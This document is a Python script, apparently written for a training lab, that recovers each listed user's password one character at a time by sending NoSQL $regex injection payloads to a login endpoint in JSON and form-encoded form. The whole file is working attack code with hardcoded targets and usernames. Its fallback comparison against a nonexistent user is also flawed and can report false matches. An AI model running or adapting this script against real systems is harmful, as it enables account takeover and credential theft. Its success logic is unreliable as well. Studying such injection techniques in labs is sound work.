#!/usr/bin/env python3
"""
NoSQL Password Enumerator - For each discovered user, enumerate password
char by character using $regex injection.
"""

import requests
import string
import sys

TARGET = "http://web0x01.hbtn/a3/nosql_injection"
# Adjust the login endpoint - might be /login or the same page
LOGIN_URL = TARGET  # or TARGET + "/login"

USERS = ["abdou", "dexter", "elon-musk", "foued", "hugo", "ismail", 
         "jeremy", "maroua", "yosri"]

# Charset to test (avoid regex-special chars initially)
CHARSET = string.ascii_lowercase + string.digits + "_-@."

def test_password_regex(username, regex_pattern):
    """Test if a password matches the given regex pattern using NoSQL injection."""
    # Try JSON format
    json_payload = {
        "username": username,
        "password": {"$regex": regex_pattern}
    }
    
    # Try URL-encoded format
    data_payload = {
        "username": username,
        "password[$regex]": regex_pattern
    }
    
    headers_json = {"Content-Type": "application/json"}
    headers_form = {"Content-Type": "application/x-www-form-urlencoded"}
    
    # Try JSON first
    r = requests.post(LOGIN_URL, json=json_payload, allow_redirects=False, timeout=10)
    
    # Check if response indicates success (not "login failed" / "invalid")
    # Adjust based on actual response differences
    if r.status_code == 302 or "success" in r.text.lower() or "welcome" in r.text.lower():
        return True, "json"
    
    # Try form-encoded
    r2 = requests.post(LOGIN_URL, data=data_payload, headers=headers_form, allow_redirects=False, timeout=10)
    if r2.status_code == 302 or "success" in r2.text.lower() or "welcome" in r2.text.lower():
        return True, "form"
    
    # If using $ne:"" also works, check if the response differs from "invalid"
    baseline = requests.post(LOGIN_URL, data={"username": "nonexistent", "password[$regex]": "^x"}, timeout=10)
    if r.text != baseline.text:
        return True, "json_diff"
    if r2.text != baseline.text:
        return True, "form_diff"
    
    return False, None

def enumerate_password(username):
    """Enumerate password for a given username character by character."""
    password = ""
    print(f"\n[*] Enumerating password for: {username}")
    
    while True:
        found_char = False
        for c in CHARSET:
            regex = f"^{password}{c}"
            sys.stdout.write(f"\r[+] Trying: {regex}   ")
            sys.stdout.flush()
            
            success, fmt = test_password_regex(username, regex)
            if success:
                password += c
                print(f"\n[+] Found char: '{c}' -> Current password: {password}")
                found_char = True
                break
        
        if not found_char:
            # Try testing if this is the complete password
            regex = f"^{password}$"
            success, _ = test_password_regex(username, regex)
            if success:
                print(f"\n[✓] COMPLETE PASSWORD for {username}: {password}")
            else:
                print(f"\n[-] Partial password for {username}: {password} (might need more chars)")
            break
    
    return password

if __name__ == "__main__":
    for user in USERS:
        pwd = enumerate_password(user)
        print(f"\nUser: {user} -> Password: {pwd}")
